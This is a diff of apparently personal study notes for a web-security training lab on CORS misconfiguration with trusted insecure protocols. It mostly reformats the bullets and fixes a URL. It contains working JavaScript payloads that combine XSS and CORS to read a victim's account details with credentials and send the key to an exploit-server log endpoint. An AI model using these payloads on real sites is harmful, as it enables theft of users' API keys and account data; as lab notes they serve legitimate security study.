@@ -52,37 +52,23 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-location='https://exploit-...exploit-server.net//log?key='+this.responseText;
+location='https://exploit-...exploit-server.net/log?key='+this.responseText;
 };
 </script>"></iframe>
 ```
 
 **Lab: CORS vulnerability with trusted insecure protocols**
 
---> find that key is retrieved via AJAX with ACAC
---> in repeater send request with header Origin: http://subdomain.lab-id 
---> find that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains (https + http)
---> find that **check stock** uses subdomain url
---> find that productID is vulnerable to XSS
+- find that key is retrieved via AJAX with ACAC
+- in repeater send request with header Origin: http://subdomain.lab-id 
+- find that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS 
+  configuration allows access from arbitrary subdomains (https + http)
+- find that **check stock** uses subdomain url
+-  find that productID is vulnerable to XSS
 
 ```html
 <script>
 document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
---> notice that inside double quotes some chars must be encoded
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+- notice that inside double quotes some chars must be encoded
